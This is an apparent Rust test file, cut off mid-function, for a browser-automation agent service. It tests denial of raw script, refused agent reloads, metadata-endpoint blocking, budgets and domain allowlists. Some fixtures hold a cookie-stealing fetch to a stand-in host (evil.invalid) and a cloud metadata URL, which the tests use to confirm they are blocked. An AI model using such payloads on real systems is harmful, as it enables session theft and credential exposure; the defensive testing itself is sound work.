use super::*;

#[tokio::test]
async fn agent_navigation_blocks_private_targets_at_edge_boundary() {
    let action = AgentAction::Navigate {
        url: "http://169.254.169.254/latest/meta-data".to_owned(),
    };
    let security = quarry_security::preflight::DefaultEngine::new();

    let error = validate_navigation(&action, &security)
        .await
        .expect_err("metadata endpoint must be blocked");

    assert_eq!(error.code, ErrorCode::SecurityBlocked);
}

#[test]
fn deny_raw_script_refuses_evaluate_only() {
    let evaluate = AgentAction::Evaluate {
        script: "document.title = 'x'".to_owned(),
    };
    assert!(deny_raw_script(&evaluate, "run_test").is_err());
    for allowed in [
        AgentAction::Click {
            selector: "#continue".to_owned(),
        },
        AgentAction::GetContent,
        AgentAction::Back,
    ] {
        deny_raw_script(&allowed, "run_test").expect("typed actions are not script");
    }
}

/// WS9.B / D2-012: a reload is refused for the agent and for it only.
#[test]
fn deny_agent_reload_refuses_an_agent_and_nobody_else() {
    let reload = AgentAction::Reload { ignore_cache: true };
    let error = deny_agent_reload(&reload, StepInitiator::Agent, "run_test")
        .expect_err("an agent's reload is refused");
    assert_eq!(error.code, ErrorCode::Forbidden);
    assert!(!error.retryable);
    let details = error.details.clone().expect("typed details");
    assert_eq!(details["reason"], "agent_reload_denied");
    assert_eq!(details["denied_action"], "reload");
    // A person's reload, and the system's, go through.
    deny_agent_reload(&reload, StepInitiator::Human, "run_test").expect("a person may reload");
    deny_agent_reload(&reload, StepInitiator::System, "run_test").expect("the edge itself may reload");
    // The agent's other navigation actions are not this rule's business.
    for other in [
        AgentAction::Back,
        AgentAction::Forward,
        AgentAction::Navigate { url: "https://example.com/".to_owned() },
    ] {
        deny_agent_reload(&other, StepInitiator::Agent, "run_test").expect("only reload is refused");
    }
}

/// A service principal and a person's token labelled agent are both the agent, so both are
/// refused at admission, and the refusal comes before the budget is looked at (nothing spent).
#[tokio::test]
async fn admission_refuses_an_agents_reload_before_the_budget_and_spends_nothing() {
    let _pinned = crate::budget::test_mode::pin(crate::budget::BudgetMode::On);
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");
    let reload = AgentAction::Reload { ignore_cache: false };
    let service = service_claims("org", "svc_planner");
    for (who, initiator) in [
        ("service principal", derive_initiator_ref(&service, None, &AdvisoryAgent::default())),
        (
            "person labelled agent",
            derive_initiator_ref(&claims, Some(InitiatorHint::Agent), &AdvisoryAgent::default()),
        ),
    ] {
        // An exhausted budget would answer 402/429 if the reload reached gate 9.
        let mut exhausted = entry_with_budget(Some(exhausted_budget()));
        exhausted.actor_id = if who == "service principal" {
            service.actor_id().to_string()
        } else {
            claims.actor_id().to_string()
        };
        let handle = handle_for(exhausted);
        let mut entry = handle.entry.lock().await;
        let steps_before = entry.budget.as_ref().map(|b| b.ledger.snapshot(std::time::Instant::now()).steps);
        let error = admit_action(
            &state,
            &handle,
            &mut entry,
            AdmitInput {
                initiator,
                action: &reload,
                enforce_takeover: true,
                consented_tab_control: false,
                last_observation: None,
                caller: None,
            },
        )
        .await
        .expect_err("an agent's reload is refused");
        assert_eq!(error.code, ErrorCode::Forbidden, "{who}");
        assert_eq!(error.details.as_ref().unwrap()["reason"], "agent_reload_denied", "{who}");
        assert!(entry.used_sensitive_approval_grants.is_empty(), "{who}");
        assert_eq!(entry.summary.step, 0, "{who}");
        assert_eq!(
            entry.budget.as_ref().map(|b| b.ledger.snapshot(std::time::Instant::now()).steps),
            steps_before,
            "{who}: a refusal spends nothing"
        );
    }
}

#[test]
fn deny_raw_script_error_is_typed_and_never_echoes_the_script() {
    let secret_script = "fetch('https://evil.invalid/?c='+document.cookie)";
    let error = deny_raw_script(
        &AgentAction::Evaluate {
            script: secret_script.to_owned(),
        },
        "run_test",
    )
    .expect_err("evaluate must be denied");
    assert_eq!(error.code, ErrorCode::Forbidden);
    assert!(!error.retryable);
    let details = error.details.clone().expect("typed details");
    assert_eq!(details["reason"], "raw_script_denied");
    assert_eq!(details["denied_action"], "evaluate");
    let rendered = serde_json::to_string(&error).unwrap();
    assert!(!rendered.contains("evil.invalid") && !rendered.contains("cookie"));
    // The REST status is 403 through the shared mapping.
    assert_eq!(error.code.http_status(), 403);
}

/// The REST entry point (`/step` and `/interact` share it) refuses raw
/// script before the approval, budget and receipt machinery, so a denial
/// consumes nothing.
#[tokio::test]
async fn step_refuses_raw_script_and_consumes_nothing() {
    let state = crate::test_support::test_state(Arc::new(
        quarry_runtime::fetch::StaticDriver::new(
            std::time::Duration::from_secs(5),
            "quarry-test",
        )
        .expect("static driver"),
    ));
    let claims = crate::test_support::claims_for_org("org");
    let handle = crate::test_support::insert_live_run(&state, &claims);
    let run_id = handle.entry.lock().await.run_id.clone();
    let entry_arc = handle.entry.clone();

    let result = step(
        State(state.clone()),
        Extension(claims),
        Path(run_id.to_string()),
        Json(StepBody {
            grant_id: None,
            action: AgentAction::Evaluate {
                script: "document.title = 'pwned'".to_owned(),
            },
            instruction: None,
            extraction_profile: None,
            initiated_by: None,
            ai_run_id: None,
            agent_label: None,
            expect: None,
        }),
    )
    .await;
    let (status, Json(envelope)) = result.expect_err("evaluate must be refused");
    assert_eq!(status, StatusCode::FORBIDDEN);
    let rendered = serde_json::to_value(&envelope).unwrap();
    assert_eq!(rendered["error"]["code"], "FORBIDDEN");
    assert_eq!(rendered["error"]["details"]["reason"], "raw_script_denied");
    assert!(
        !rendered.to_string().contains("pwned"),
        "the script is never echoed"
    );

    let entry = entry_arc.lock().await;
    assert_eq!(entry.summary.step, 0, "a denial does not consume a step");
    assert!(entry.used_sensitive_approval_grants.is_empty());
}

#[tokio::test]
async fn non_navigation_actions_do_not_trigger_network_validation() {
    let action = AgentAction::Click {
        selector: "#continue".to_owned(),
    };
    let security = quarry_security::preflight::DefaultEngine::new();

    validate_navigation(&action, &security).await.unwrap();
}

#[test]
fn provider_meter_cost_is_copied_exactly_and_unknown_remains_unknown_in_telemetry() {
    let unknown = BrowserTelemetry::default();
    assert_eq!(unknown.verified_action_cost_micro_usd, None);
    assert_eq!(telemetry_receipt_cost_usd(&unknown), 0.0);

    let metered = BrowserTelemetry {
        verified_action_cost_micro_usd: Some(12_345),
        ..BrowserTelemetry::default()
    };
    assert!((telemetry_receipt_cost_usd(&metered) - 0.012_345).abs() < f64::EPSILON);
}

/// T4b-1 review: a step refused for the page it landed on did run, so it keeps the driver's
/// cost; an action that failed is charged the flat table.
#[test]
fn a_refused_landing_keeps_the_driver_cost_and_a_failed_action_the_flat_table() {
    use quarry_runtime::action_cost::CostSource;

    let action = AgentAction::Wait { ms: 0 };
    let metered = BrowserTelemetry {
        verified_action_cost_micro_usd: Some(12_345),
        ..BrowserTelemetry::default()
    };
    let (cost, source) = failed_step_cost(Some(&metered), &action);
    assert!((cost - 0.012_345).abs() < f64::EPSILON);
    assert_eq!(source, CostSource::ProviderBilled);
    assert_eq!(
        failed_step_cost(None, &action),
        (estimated_action_cost_usd(&action), CostSource::FlatTable)
    );
    assert_eq!(
        failed_step_cost(Some(&BrowserTelemetry::default()), &action),
        (estimated_action_cost_usd(&action), CostSource::FlatTable)
    );
}

#[test]
fn zdr_forbids_persistent_profile_when_profile_id_supplied() {
    assert!(zdr_forbids_persistent_profile(ZdrMode::On, false, true));
}

#[test]
fn zdr_forbids_persistent_profile_when_flag_set_without_id() {
    assert!(zdr_forbids_persistent_profile(ZdrMode::On, true, false));
}

#[test]
fn zdr_forbids_persistent_profile_when_both_signals_present() {
    assert!(zdr_forbids_persistent_profile(ZdrMode::On, true, true));
}

#[test]
fn zdr_run_with_no_persistence_signal_is_allowed() {
    assert!(!zdr_forbids_persistent_profile(ZdrMode::On, false, false));
}

#[test]
fn non_zdr_run_may_request_a_persistent_profile() {
    assert!(!zdr_forbids_persistent_profile(ZdrMode::Off, true, true));
}

#[test]
fn browser_session_projection_requires_exact_tenant_and_actor() {
    let claims = crate::auth::Claims {
        web_policy: None,
        sub: "user-owner".to_owned(),
        iss: "https://auth.example.test".to_owned(),
        exp: i64::MAX,
        org_id: "org-owner".to_owned(),
        user_id: "user-owner".to_owned(),
        principal_type: Some("user".to_owned()),
        service_id: None,
        nbf: None,
        aud: Some("quarry".to_owned()),
        scopes: Vec::new(),
        zdr: None,
        key_id: None,
        acting_user_id: None,
    };

    assert!(caller_owns_browser_run("org-owner", "user-owner", &claims));
    assert!(!caller_owns_browser_run("org-owner", "user-other", &claims));
    assert!(!caller_owns_browser_run("org-other", "user-owner", &claims));
    assert!(!caller_owns_browser_run("org-owner", "", &claims));
}

#[test]
fn allowed_domains_accept_exact_and_subdomains_only() {
    let allowed = vec!["example.com".to_owned()];
    assert!(domain_allowed("https://example.com/path", &allowed));
    assert!(domain_allowed("https://docs.example.com/path", &allowed));
    assert!(!domain_allowed(
        "https://example.com.evil.test/path",
        &allowed
    ));
    assert!(!domain_allowed("https://other.test/path", &allowed));
}

#[test]
fn step_budget_is_fail_closed_once_limit_is_reached() {
    let mut entry = RunEntry {
        run_id: Id::new(),
        org_id: "org".into(),
        actor_id: "user".into(),
        key_id: None,
        session: BrowserSession {
            lease: BrowserLease {
                lease_id: Id::new(),
                profile_id: Id::new(),
                session_affinity_key: "test-session".into(),
                proxy_affinity: Default::default(),
                ttl_s: 60,
                capabilities: vec![],
                artifact_bucket: String::new(),
                persist_profile: false,
                viewport: None,
                org_id: "org".into(),
            },
            tab_pin: None,
            inner: Arc::new(TokioMutex::new(SessionInner::default())),
        },
        human_lane: LaneRef::new(LaneState { ctx: ObservationContext {
            step: 2,
            current_url: String::new(),
            page_hash: String::new(),
            previous_screenshot: None,
            previous_observation: None,
            previous_network_keys: vec![],
            last_egress_sequence: 0,
            active_snapshot: None,
            observed_action_count: 0,
            challenge_observation_count: 0,
            ..Default::default()
        }, last_observation: None }),
        summary: LaneSummary { step: 2, ..Default::default() },
        lease: BrowserLease {
            lease_id: Id::new(),
            profile_id: Id::new(),
            session_affinity_key: "test".into(),
            proxy_affinity: Default::default(),
            ttl_s: 60,
            capabilities: vec![],
            artifact_bucket: String::new(),
            persist_profile: false,
            viewport: None,
            org_id: "org".into(),
        },
        constraints: AgentConstraints {
            max_steps: 2,
            allowed_domains: vec![],
            max_runtime_s: None,
            max_cost_usd: None,
        },
        zdr: ZdrMode::Off,
        grant_id: None,
        control_mode: BrowserControlMode::AgentControl,
        control_epoch: 0,
        profile_scope: BrowserProfileScope::Ephemeral,
        execution_tier: BrowserExecutionTier::Chromium,
        used_sensitive_approval_grants: HashSet::new(),
        budget: None,
        closed: false,
        last_rejected_epoch: None,
        tab_origins: HashMap::new(),
        nav_policy: super::human_browse::RunNavPolicy::Allowlist,
        origin_extension: None,
        origin_extension_lane_stale: false,
        origin: quarry_core::trace::RunOrigin::User,
        model_run_id: None,
        agent: None,
    };
    assert!(enforce_step_budget(&entry).is_err());
    entry.constraints.max_steps = 0;
    assert!(enforce_step_budget(&entry).is_ok());
}

fn entry_with_budget(budget: Option<crate::budget::RunBudget>) -> RunEntry {
    let lease = BrowserLease {
        lease_id: Id::new(),
        profile_id: Id::new(),
        session_affinity_key: "test".into(),
        proxy_affinity: Default::default(),
        ttl_s: 60,
        capabilities: vec![],
        artifact_bucket: String::new(),
        persist_profile: false,
        viewport: None,
        org_id: "org".into(),
    };
    RunEntry {
        run_id: Id::new(),
        org_id: "org".into(),
        actor_id: "user".into(),
        key_id: None,
        session: BrowserSession {
            lease: lease.clone(),
            tab_pin: None,
            inner: Arc::new(TokioMutex::new(SessionInner::default())),
        },
        human_lane: LaneRef::new(LaneState { ctx: ObservationContext {
            step: 0,
            current_url: String::new(),
            page_hash: String::new(),
            previous_screenshot: None,
            previous_observation: None,
            previous_network_keys: vec![],
            last_egress_sequence: 0,
            active_snapshot: None,
            observed_action_count: 0,
            challenge_observation_count: 0,
            ..Default::default()
        }, last_observation: None }),
        summary: LaneSummary { step: 0, ..Default::default() },
        lease,
        constraints: AgentConstraints {
            max_steps: 0,
            allowed_domains: vec![],
            max_runtime_s: None,
            max_cost_usd: None,
        },
        zdr: ZdrMode::Off,
        grant_id: None,
        control_mode: BrowserControlMode::AgentControl,
        control_epoch: 0,
        profile_scope: BrowserProfileScope::Ephemeral,
        execution_tier: BrowserExecutionTier::Chromium,
        used_sensitive_approval_grants: HashSet::new(),
        budget,
        closed: false,
        last_rejected_epoch: None,
        tab_origins: HashMap::new(),
        nav_policy: super::human_browse::RunNavPolicy::Allowlist,
        origin_extension: None,
        origin_extension_lane_stale: false,
        origin: quarry_core::trace::RunOrigin::User,
        model_run_id: None,
        agent: None,
    }
}

fn agent_budget(max_steps: u32) -> crate::budget::RunBudget {
    crate::budget::RunBudget::start(
        &crate::budget::BudgetLimits::default(),
        crate::budget::RunClass::Agent,
        &AgentConstraints {
            max_steps,
            allowed_domains: vec![],
            max_runtime_s: None,
            max_cost_usd: None,
        },
        None,
        std::time::Instant::now(),
    )
}

#[test]
fn an_agent_run_is_refused_with_402_after_its_step_cap_in_on_mode() {
    use crate::budget::BudgetMode;
    let mut entry = entry_with_budget(Some(agent_budget(3)));
    let action = AgentAction::Click {
        selector: "#go".into(),
    };
    for _ in 0..3 {
        budget_gate_with(&mut entry, &action, BudgetMode::On).expect("within the cap");
        budget_charge(&mut entry, true, 0.0);
    }
    let error = budget_gate_with(&mut entry, &action, BudgetMode::On).unwrap_err();
    assert_eq!(error.code, ErrorCode::BudgetExhausted);
    assert_eq!(error.code.http_status(), 402);
    assert!(!error.retryable);
    assert_eq!(error.details.as_ref().unwrap()["dimension"], "steps");
    // It stays refused: calling again cannot refill it.
    assert!(budget_gate_with(&mut entry, &action, BudgetMode::On).is_err());
}

#[test]
fn a_failing_driver_hits_the_attempt_allowance_before_the_step_cap() {
    use crate::budget::BudgetMode;
    let mut entry = entry_with_budget(Some(agent_budget(5)));
    let action = AgentAction::Back;
    // 5 steps x factor 2 = 10 attempts; every one fails.
    for _ in 0..10 {
        budget_gate_with(&mut entry, &action, BudgetMode::On).expect("within attempts");
        budget_charge(&mut entry, false, estimated_action_cost_usd(&action));
    }
    let error = budget_gate_with(&mut entry, &action, BudgetMode::On).unwrap_err();
    assert_eq!(error.details.as_ref().unwrap()["dimension"], "attempts");
}

#[test]
fn a_human_session_is_never_budgeted_even_in_on_mode() {
    use crate::budget::{BudgetMode, RunBudget, RunClass};
    let human = RunBudget::start(
        &crate::budget::BudgetLimits::default(),
        RunClass::Interactive,
        &AgentConstraints {
            max_steps: 12,
            allowed_domains: vec![],
            max_runtime_s: Some(120),
            max_cost_usd: None,
        },
        None,
        std::time::Instant::now(),
    );
    let mut entry = entry_with_budget(Some(human));
    let action = AgentAction::Back;
    for _ in 0..40 {
        budget_gate_with(&mut entry, &action, BudgetMode::On)
            .expect("a person is not capped");
        budget_charge(&mut entry, true, 0.5);
    }
}

#[test]
fn shadow_and_off_modes_never_refuse_and_a_run_without_a_budget_is_untouched() {
    use crate::budget::BudgetMode;
    let action = AgentAction::Back;
    let mut entry = entry_with_budget(Some(agent_budget(1)));
    budget_charge(&mut entry, true, 0.0);
    assert!(budget_gate_with(&mut entry, &action, BudgetMode::Shadow).is_ok());
    assert!(budget_gate_with(&mut entry, &action, BudgetMode::Off).is_ok());
    let mut bare = entry_with_budget(None);
    assert!(budget_gate_with(&mut bare, &action, BudgetMode::On).is_ok());
    budget_charge(&mut bare, true, 1.0);
}

#[test]
fn a_budget_refusal_leaves_the_step_counter_and_approvals_alone() {
    use crate::budget::BudgetMode;
    let mut entry = entry_with_budget(Some(agent_budget(1)));
    budget_charge(&mut entry, true, 0.0);
    entry
        .used_sensitive_approval_grants
        .insert("grant_1".into());
    let before = (entry.summary.step, entry.used_sensitive_approval_grants.clone());
    assert!(budget_gate_with(&mut entry, &AgentAction::Back, BudgetMode::On).is_err());
    assert_eq!(
        (entry.summary.step, entry.used_sensitive_approval_grants.clone()),
        before
    );
}

async fn call_step(
    budget: Option<crate::budget::RunBudget>,
    action: AgentAction,
) -> (
    Result<(), (StatusCode, serde_json::Value)>,
    Arc<TokioMutex<RunEntry>>,
) {
    call_step_on(entry_with_budget(budget), action, None).await
}

async fn call_step_on(
    mut entry: RunEntry,
    action: AgentAction,
    initiated_by: Option<InitiatorHint>,
) -> (
    Result<(), (StatusCode, serde_json::Value)>,
    Arc<TokioMutex<RunEntry>>,
) {
    let state = crate::test_support::test_state(Arc::new(
        quarry_runtime::fetch::StaticDriver::new(
            std::time::Duration::from_secs(5),
            "quarry-test",
        )
        .expect("static driver"),
    ));
    let claims = crate::test_support::claims_for_org("org");
    entry.actor_id = claims.actor_id().to_string();
    let run_id = entry.run_id.to_string();
    let handle = handle_for(entry);
    let entry_arc = handle.entry.clone();
    state
        .agent_runs
        .lock()
        .expect("agent_runs mutex")
        .insert(run_id.clone(), handle);
    let result = step(
        State(state),
        Extension(claims),
        Path(run_id),
        Json(StepBody {
            grant_id: None,
            action,
            instruction: None,
            extraction_profile: None,
            initiated_by,
            ai_run_id: None,
            agent_label: None,
            expect: None,
        }),
    )
    .await;
    let mapped = result.map(|_| ()).map_err(|(status, Json(envelope))| {
        (status, serde_json::to_value(&envelope).unwrap())
    });
    (mapped, entry_arc)
}

fn respond_dialog() -> AgentAction {
    AgentAction::RespondDialog {
        dialog_id: "dlg_1".into(),
        accept: true,
        approval_grant_id: "grant_approval_1".into(),
        prompt_text: None,
    }
}

fn exhausted_budget() -> crate::budget::RunBudget {
    let mut budget = agent_budget(1);
    budget.charge(true, 0);
    budget
}

/// The budget refuses before a one-shot approval is looked at, let alone
/// consumed: with the run out of steps, an action that also needs an
/// approval gets the 402, not the approval's own error.
#[tokio::test]
async fn a_budget_refusal_comes_first_and_burns_no_single_use_approval() {
    let _pinned = crate::budget::test_mode::pin(crate::budget::BudgetMode::On);
    let (result, entry_arc) = call_step(Some(exhausted_budget()), respond_dialog()).await;
    let (status, body) = result.expect_err("the run is out of budget");
    assert_eq!(status, StatusCode::PAYMENT_REQUIRED);
    assert_eq!(body["error"]["code"], "BUDGET_EXHAUSTED");
    assert_eq!(body["error"]["retryable"], false);
    assert_eq!(body["error"]["details"]["dimension"], "steps");
    let entry = entry_arc.lock().await;
    assert!(entry.used_sensitive_approval_grants.is_empty());
    assert_eq!(entry.summary.step, 0, "a refusal does not run the action");
}

/// D2-014 and the X-12 edge guard: the request's own step cap (`constraints.max_steps`) refuses
/// an agent-initiated step on a person-class run (429). Budget `shadow` is the default and is
/// meant to refuse nothing new, so it does not lift that cap. In `on` a person's own step is
/// never capped, but the agent-initiated step keeps the cap: the typed gate has no caps for a
/// person-class run, so lifting it would leave a model-proposed step in a person's session with
/// no bound at all. (This test used to assert that `on` lifted the cap for the agent-initiated
/// step too; that contradicted the accepted decision 3.3, which asks for the guard.)
#[tokio::test]
async fn a_persons_own_steps_are_uncapped_in_on_but_an_agent_step_in_their_session_keeps_its_cap() {
    use crate::budget::{BudgetMode, RunBudget, RunClass};
    let person_run = || {
        let budget = RunBudget::start(
            &crate::budget::BudgetLimits::default(),
            RunClass::Interactive,
            &AgentConstraints {
                max_steps: 2,
                allowed_domains: vec![],
                max_runtime_s: None,
                max_cost_usd: None,
            },
            None,
            std::time::Instant::now(),
        );
        let mut entry = entry_with_budget(Some(budget));
        entry.constraints.max_steps = 2;
        entry.summary.step = 2;
        entry
    };

    let _shadow = crate::budget::test_mode::pin(BudgetMode::Shadow);
    let (result, _) = call_step_on(person_run(), respond_dialog(), Some(InitiatorHint::Agent)).await;
    let (status, body) = result.expect_err("the person-class run's request cap still refuses in shadow");
    assert_eq!(status, StatusCode::TOO_MANY_REQUESTS, "{body}");
    drop(_shadow);

    let _on = crate::budget::test_mode::pin(BudgetMode::On);
    // The agent-initiated step inside the person's session keeps its only bound.
    let (result, _) = call_step_on(person_run(), respond_dialog(), Some(InitiatorHint::Agent)).await;
    let (status, body) = result.expect_err("the agent-initiated step is still capped in on");
    assert_eq!(status, StatusCode::TOO_MANY_REQUESTS, "{body}");
    assert_ne!(body["error"]["code"], "BUDGET_EXHAUSTED", "the legacy 429, not a typed 402: {body}");
    // The person's own step on the same run is uncapped: it goes on to the approval check,
    // which refuses it for its own reason.
    let (result, _) = call_step_on(person_run(), respond_dialog(), None).await;
    let (status, body) = result.expect_err("the step goes on to the approval check, which refuses it");
    assert_ne!(status, StatusCode::TOO_MANY_REQUESTS, "a person is never capped: {body}");
    assert_ne!(body["error"]["code"], "BUDGET_EXHAUSTED", "{body}");
}

#[tokio::test]
async fn shadow_mode_lets_the_same_step_reach_the_approval_check() {
    let _pinned = crate::budget::test_mode::pin(crate::budget::BudgetMode::Shadow);
    let (result, _entry) = call_step(Some(exhausted_budget()), respond_dialog()).await;
    let (status, body) =
        result.expect_err("no parent run grant, so the approval is refused");
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    assert_ne!(body["error"]["code"], "BUDGET_EXHAUSTED");
}

fn live_runs(count: usize) -> (AgentRuns, Vec<String>) {
    let runs: AgentRuns = Arc::default();
    let mut ids = Vec::new();
    for _ in 0..count {
        let entry = entry_with_budget(None);
        let id = entry.run_id.to_string();
        runs.lock()
            .unwrap()
            .insert(id.clone(), handle_for(entry));
        ids.push(id);
    }
    (runs, ids)
}

fn test_driver() -> Arc<dyn quarry_browser::BrowserDriver> {
    Arc::new(quarry_browser::chromiumoxide::ChromiumoxideDriver::new())
}

// These drain tests use a driver with no browser, so they check the report, the registry and
// the closed flag. That the driver is actually asked to release each idle run (and not the
// busy one) is checked against the recording driver in
// `tests/run_sweeper_integration.rs`
// (`the_shutdown_drain_releases_every_idle_runs_session_and_leaves_a_busy_one`).
#[tokio::test]
async fn a_drain_reports_every_live_run_and_empties_the_registry() {
    let (runs, _) = live_runs(5);
    let report = drain_runs(&runs, &test_driver(), std::time::Duration::from_secs(5)).await;
    assert_eq!(
        report,
        DrainReport {
            released: 5,
            failed: 0,
            in_use: 0
        }
    );
    assert!(
        runs.lock().unwrap().is_empty(),
        "nothing is left registered"
    );
}

#[tokio::test]
async fn a_run_a_request_still_holds_a_clone_of_is_drained_and_closed_all_the_same() {
    // A request that looked the run up keeps an Arc to it; that used to make the drain
    // skip the run and leave its browser to die with the process.
    let (runs, ids) = live_runs(3);
    let held = runs
        .lock()
        .unwrap()
        .get(&ids[1])
        .cloned()
        .expect("registered");
    let report = drain_runs(&runs, &test_driver(), std::time::Duration::from_secs(5)).await;
    assert_eq!(
        report,
        DrainReport {
            released: 3,
            failed: 0,
            in_use: 0
        }
    );
    assert!(runs.lock().unwrap().is_empty());
    assert!(
        held.entry.lock().await.closed,
        "a request queued behind the drain is refused, not run on a released session"
    );
}

#[tokio::test]
async fn a_run_whose_action_outlasts_the_deadline_is_counted_in_use_and_does_not_block_the_rest() {
    let (runs, ids) = live_runs(3);
    let busy = runs
        .lock()
        .unwrap()
        .get(&ids[1])
        .cloned()
        .expect("registered");
    // An action holds the run lock for the whole drain.
    let action = busy.entry.lock().await;
    let report = drain_runs(&runs, &test_driver(), std::time::Duration::from_millis(200)).await;
    assert_eq!(
        report,
        DrainReport {
            released: 2,
            failed: 0,
            in_use: 1
        }
    );
    assert!(runs.lock().unwrap().is_empty());
    assert!(!action.closed, "the busy run was left alone");
}

#[tokio::test]
async fn draining_an_empty_registry_is_a_no_op() {
    let (runs, _) = live_runs(0);
    let report = drain_runs(&runs, &test_driver(), std::time::Duration::from_secs(1)).await;
    assert_eq!(report, DrainReport::default());
}

#[test]
fn the_takeover_time_is_set_by_a_takeover_kept_by_a_repeat_and_unknown_after_a_restore() {
    let live = RunLive::new("org", "user", BrowserControlMode::AgentControl, 0);
    assert_eq!(live.taken_over_at_ms(), None);
    live.set_mode(BrowserControlMode::HumanTakeover, None).unwrap();
    let at = live.taken_over_at_ms().expect("a takeover has a start");
    assert!(at > 0);
    // A repeated request changes nothing, so the start does not move.
    live.set_mode(BrowserControlMode::HumanTakeover, None).unwrap();
    assert_eq!(live.taken_over_at_ms(), Some(at));
    live.set_mode(BrowserControlMode::AgentControl, None).unwrap();
    assert_eq!(live.taken_over_at_ms(), None);
    // A checkpoint does not carry the start, so a resumed takeover has none.
    live.restore(5, BrowserControlMode::HumanTakeover);
    assert_eq!(live.taken_over_at_ms(), None);
}

#[test]
fn the_user_took_over_details_name_the_start_only_when_it_is_known() {
    let snapshot = ControlSnapshot {
        mode: BrowserControlMode::HumanTakeover,
        epoch: 3,
    };
    let known = user_took_over(snapshot, Some(1_700_000_000_000)).details.expect("details");
    assert_eq!(known["control_mode"], "human_takeover");
    assert_eq!(known["control_epoch"], 3);
    assert_eq!(known["taken_over_at"], "2023-11-14T22:13:20+00:00");
    let unknown = user_took_over(snapshot, None).details.expect("details");
    assert!(unknown.get("taken_over_at").is_none(), "{unknown}");
}

#[test]
fn the_checkpoint_carries_the_ledger_and_a_resume_restores_it() {
    use crate::budget::{BudgetMode, RunBudget};
    let mut entry = entry_with_budget(Some(agent_budget(2)));
    budget_charge(&mut entry, true, 0.001);
    budget_charge(&mut entry, true, 0.001);
    let live = handle_for(entry_with_budget(None)).live;
    let checkpoint = checkpoint_for_entry(&entry, &live);
    let saved = checkpoint
        .budget
        .clone()
        .expect("a budget in the checkpoint");
    assert_eq!(
        (saved.steps, saved.attempts, saved.spent_micro_usd),
        (2, 2, 2000)
    );
    assert_eq!(saved.class, "agent");
    // It survives the JSON the store writes.
    let stored: quarry_runtime::step_receipts::AgentRunCheckpoint =
        serde_json::from_value(serde_json::to_value(&checkpoint).unwrap()).unwrap();
    assert_eq!(stored.budget, checkpoint.budget);

    let resumed = RunBudget::start(
        &crate::budget::BudgetLimits::default(),
        crate::budget::RunClass::Agent,
        &AgentConstraints {
            max_steps: 2,
            allowed_domains: vec![],
            max_runtime_s: None,
            max_cost_usd: None,
        },
        stored.budget.as_ref(),
        std::time::Instant::now(),
    );
    let mut resumed_entry = entry_with_budget(Some(resumed));
    let error = budget_gate_with(&mut resumed_entry, &AgentAction::Back, BudgetMode::On)
        .unwrap_err();
    assert_eq!(error.details.as_ref().unwrap()["dimension"], "steps");
}

#[test]
fn an_old_checkpoint_without_a_budget_still_loads() {
    // What a checkpoint looked like before budgets: the same JSON without the field.
    let mut legacy = serde_json::to_value(checkpoint_for_entry(
        &entry_with_budget(None),
        &handle_for(entry_with_budget(None)).live,
    ))
    .unwrap();
    legacy.as_object_mut().unwrap().remove("budget");
    let checkpoint: quarry_runtime::step_receipts::AgentRunCheckpoint =
        serde_json::from_value(legacy).expect("a pre-budget checkpoint loads");
    assert!(checkpoint.budget.is_none());
}

#[test]
fn every_path_prices_a_completed_action_from_the_flat_table_when_the_driver_gave_none() {
    let action = AgentAction::Click {
        selector: "#go".into(),
    };
    let unmetered = BrowserTelemetry::default();
    let flat = estimated_action_cost_usd(&action);
    assert!(flat > 0.0, "the flat table prices a click");
    assert_eq!(receipt_cost_usd(&unmetered, &action), flat);
    let metered = BrowserTelemetry {
        verified_action_cost_micro_usd: Some(7),
        ..BrowserTelemetry::default()
    };
    assert!((receipt_cost_usd(&metered, &action) - 0.000_007).abs() < 1e-12);
}

#[test]
fn normalize_viewport_accepts_reasonable_desktop_size() {
    let viewport = normalize_viewport(Some(BrowserViewport {
        width: 1280,
        height: 800,
        device_scale_factor: 0.0,
        is_mobile: false,
    }))
    .expect("valid viewport")
    .expect("viewport");

    assert_eq!(viewport.width, 1280);
    assert_eq!(viewport.height, 800);
    assert_eq!(viewport.device_scale_factor, 1.0);
    assert!(!viewport.is_mobile);
}

#[test]
fn normalize_viewport_rejects_unbounded_sizes() {
    let err = normalize_viewport(Some(BrowserViewport {
        width: 10_000,
        height: 800,
        device_scale_factor: 1.0,
        is_mobile: false,
    }))
    .expect_err("oversized viewport should be rejected");

    assert!(err.contains("viewport"));
}

#[test]
fn frame_stream_query_accepts_url_encoded_numbers() {
    let uri: axum::http::Uri =
        "/frames/ws?tabId=tab-2&format=jpeg&quality=55&maxWidth=640&maxHeight=480&everyNthFrame=2&timeoutMs=750&intervalMs=150&maxFrames=8"
            .parse()
            .expect("valid uri");
    let Query(query) = Query::<FrameStreamQuery>::try_from_uri(&uri)
        .expect("browser query numbers should parse");

    assert_eq!(query.frame.format.as_deref(), Some("jpeg"));
    assert_eq!(query.frame.tab_id.as_deref(), Some("tab-2"));
    assert_eq!(query.frame.quality, Some(55));
    assert_eq!(query.frame.max_width, Some(640));
    assert_eq!(query.frame.max_height, Some(480));
    assert_eq!(query.frame.every_nth_frame, Some(2));
    assert_eq!(query.frame.timeout_ms, Some(750));
    assert_eq!(query.interval_ms, Some(150));
    assert_eq!(query.max_frames, Some(8));
}

#[test]
fn live_frame_options_clamp_stream_parameters() {
    let options = live_frame_options(
        &FrameQuery {
            tab_id: None,
            format: Some("jpeg".to_owned()),
            quality: Some(0),
            max_width: Some(99_999),
            max_height: Some(10),
            every_nth_frame: Some(0),
            timeout_ms: Some(99_999),
        },
        BrowserViewport {
            width: 1280,
            height: 800,
            device_scale_factor: 1.0,
            is_mobile: false,
        },
    )
    .expect("valid frame options");

    assert_eq!(options.quality, 1);
    assert_eq!(options.max_width, 1280);
    assert_eq!(options.max_height, 240);
    assert_eq!(options.every_nth_frame, 1);
    assert_eq!(options.timeout_ms, 5_000);
}

#[test]
fn browser_ws_client_message_parses_action() {
    let message: BrowserWsClientMessage = serde_json::from_value(serde_json::json!({
        "type": "action",
        "action": { "type": "click_point", "x": 12.5, "y": 30.0 },
        "instruction": "human takeover click"
    }))
    .expect("valid websocket action");

    match message {
        BrowserWsClientMessage::Action {
            action: AgentAction::ClickPoint { x, y },
            instruction,
            ..
        } => {
            assert_eq!(x, 12.5);
            assert_eq!(y, 30.0);
            assert_eq!(instruction.as_deref(), Some("human takeover click"));
        }
        other => panic!("unexpected message: {other:?}"),
    }
}

fn handle_for(entry: RunEntry) -> RunHandle {
    let live = RunLive::new(
